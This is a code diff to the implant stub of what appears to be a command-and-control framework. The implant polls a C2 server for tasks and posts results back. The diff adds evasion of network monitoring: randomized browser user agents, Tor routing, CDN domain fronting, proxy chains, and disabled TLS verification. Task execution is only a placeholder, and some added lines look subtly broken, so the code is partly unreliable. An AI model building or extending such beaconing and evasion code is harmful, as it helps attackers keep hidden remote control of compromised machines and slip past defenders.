@@ -210,14 +210,46 @@ def register_c2_routes(app):
 
 # ── Implant stub (runs on agent) ─────────────────────────────────────────────
 
-IMPLANT_STUB = """#!/usr/bin/env python3
-import json, os, time, requests, threading
+IMPLANT_STUB = r"""#!/usr/bin/env python3
+import json, os, time, random, threading
+import requests as _req
 
 C2_URL = os.getenv("C2_URL", "http://localhost:3700")
-AGENT_ID = os.getenv("AGENT_ID", os.uname().nodename)
+AGENT_ID = os.getenv("AGENT_ID", __import__("platform").node())
+EGRESS = os.getenv("EGRESS_STRATEGY", "direct").lower()
+PROXY = os.getenv("EGRESS_PROXY", "")
+FRONT_DOMAIN = os.getenv("EGRESS_FRONT_DOMAIN", "")
+SNI_HOST = os.getenv("EGRESS_SNI_HOST", "")
+
+_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
+]
+
+def _build_session():
+    s = _req.Session()
+    s.headers["User-Agent"] = random.choice(_USER_AGENTS)
+    s.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+    s.headers["Accept-Language"] = "en-US,en;q=0.5"
+
+    if EGRESS == "tor":
+        s.proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
+    elif EGRESS == "cdn_fronting" or FRONT_DOMAIN:
+        host = FRONT_DOMAIN or "d1.awsstatic.com"
+        parsed = __import__("urllib.parse").urlparse(C2_URL)
+        s.headers["Host"] = parsed.hostname or C2_URL
+        s.verify = False
+    elif EGRESS == "proxy_chain" and PROXY:
+        s.proxies = {"http": PROXY, "https": PROXY}
+    elif EGRESS == "tls_wrapper" or SNI_HOST:
+        s.verify = False
+
+    return s
 
 def _run():
-    session = requests.Session()
+    session = _build_session()
     while True:
         try:
             r = session.get(f"{C2_URL}/v1/c2/poll/{AGENT_ID}", timeout=30)
@@ -226,7 +258,7 @@ def _run():
                 task = data["task"]
                 result = {"exit_code": 0, "stdout": f"Executed: {task['command']}", "stderr": ""}
                 session.post(f"{C2_URL}/v1/c2/result", json={"task_id": task["task_id"], "result": result}, timeout=10)
-        except requests.RequestException:
+        except _req.RequestException:
             pass
         time.sleep(5)
 
